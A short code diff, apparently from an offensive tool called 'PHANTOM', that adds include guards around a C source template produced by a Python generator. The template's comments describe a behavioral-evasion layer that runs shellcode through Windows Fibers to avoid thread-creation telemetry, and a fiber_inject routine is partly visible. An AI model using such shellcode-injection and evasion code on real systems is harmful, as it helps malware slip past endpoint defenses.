@@ -30,6 +30,9 @@ def generate_fiber_injection() -> Dict[str, Any]:
 // Layer 4 – Behavioral Evasion
 // Executes shellcode via Windows Fibers to avoid thread-creation telemetry.
 
+#ifndef PHANTOM_FIBER_INJECTION_INCLUDED
+#define PHANTOM_FIBER_INJECTION_INCLUDED
+
 #include <windows.h>
 
 // Fiber parameter block passed between fibers
@@ -91,6 +94,8 @@ static BOOL fiber_inject(unsigned char *shellcode, size_t shellcode_len) {
     VirtualFree(mem, 0, MEM_RELEASE);
     return TRUE;
 }
+
+#endif /* PHANTOM_FIBER_INJECTION_INCLUDED */
 """
 
     return {
